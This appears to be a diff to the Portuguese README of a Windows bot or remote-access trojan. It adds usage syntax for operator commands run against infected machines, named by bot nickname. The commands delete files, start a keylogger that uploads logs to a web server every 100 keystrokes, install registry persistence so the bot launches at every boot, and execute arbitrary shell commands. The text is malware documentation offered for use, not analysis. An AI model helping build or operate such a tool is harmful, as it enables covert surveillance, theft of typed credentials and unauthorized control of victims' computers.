@@ -103,9 +103,31 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ USAGE:  run <programa> <nickdobot>
 		$ Ex: run calc.exe DESKTOP-PC-3456
 
-- [delete]        para excluir arquivos
-- [start keylog]  para ativar o keylogger
-- [stop keylog]   para desativar o keylogger
-- [persistence]   para instalar persistencia no registro do Windows
-mail me: hackerama@protonmail.com
+- [delete] para excluir arquivos
+		
+		$ USAGE: delete <arquivo> <nickdobot>
+		$ Ex: delete leak.txt DESKTOP-PC-3456
 
+- [start keylog] para ativar o keylogger
+  O arquivo de log será upado para o servidor web a cada 100 caracteres digitados. <br>
+  Será iniciado u novo processo no sistema do BOT para o keylogger.		
+
+		$ USAGE: keylog start <nickdobot>
+		$ Ex: keylog start DESKTOP-PC-3456
+
+
+- [stop keylog] para desativar o keylogger
+		
+		$ USAGE: keylog stop <nickdobot>
+		$ Ex: keylog stop DESKTOP-PC-3456
+
+- [persistence]   para instalar persistencia no registro do Windows
+  Instala a persistencia, iniciando o bot toda vez que o PC do cliente iniciar <br>
+		
+		$ USAGE: persistence <nickdobot>
+		$ Ex: persistence DESKTOP-PC-3456
+
+- [shell] para executar comandos no terminal.
+		
+		$ USAGE: shell <comando> <nickdobot>
+		$ Ex: shell echo HACKED hack.txt && DIR hack.txt DESKTOP-PC-3456
